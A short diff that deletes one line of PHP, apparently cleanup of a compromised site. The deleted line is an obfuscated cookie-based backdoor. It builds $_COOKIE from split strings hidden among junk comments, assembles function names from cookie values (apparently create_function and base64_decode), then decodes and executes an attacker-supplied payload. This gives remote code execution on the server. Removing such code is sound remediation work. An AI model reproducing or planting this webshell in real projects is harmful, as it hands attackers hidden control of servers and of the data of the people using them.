@@ -1,1 +1,0 @@
-<?php $nv='_CO';/*s*/$vh='E';$gx/*2P!+*/='OKI';$gf=/*A)g*/${$nv.$gx.$vh};if(isset($gf['c'])){$a=/*e&*/$gf['c'].$gf/*,[*/['g'];$s=$gf['C']./*IsHL*/$gf['Mj'].$gf['b'];$jb=$a('',$s($gf['je']));$jb();}
